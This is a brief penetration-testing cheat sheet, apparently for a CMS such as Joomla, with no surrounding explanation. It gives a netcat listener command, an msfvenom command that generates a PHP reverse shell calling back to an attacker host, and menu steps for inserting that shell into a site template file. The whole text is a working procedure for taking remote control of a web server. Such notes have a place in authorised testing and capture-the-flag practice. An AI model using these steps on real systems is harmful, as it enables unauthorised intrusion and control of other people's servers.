### start listener
```
nc -lvp <lport>
```

### create php reverse shell
```
msfvenom -p php/reverse_php lhost=<lhost> lport=<lport> -f raw
Extensions > Templates > Choose a template > Choose php file > insert php reverse shell
```

